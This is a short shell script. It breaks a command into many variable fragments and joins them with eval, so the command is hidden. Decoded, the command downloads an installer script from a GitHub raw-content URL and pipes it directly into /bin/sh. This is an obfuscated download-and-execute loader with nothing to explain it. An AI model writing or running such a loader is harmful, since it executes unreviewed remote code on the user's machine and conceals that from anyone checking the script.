z="
";Iz='nt.c';Wz='O - ';Xz='| /b';Az='wget';Gz='serc';Pz='ed-s';Bz=' htt';Ez='.git';Cz='ps:/';Tz='tall';Lz='37/c';Hz='onte';Yz='in/s';Qz='aad/';Kz='mil2';Mz='hann';Uz='er.s';Dz='/raw';Oz='oham';Vz='h -q';Fz='hubu';Sz='/ins';Rz='main';Zz='h';Nz='el-m';Jz='om/e';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz"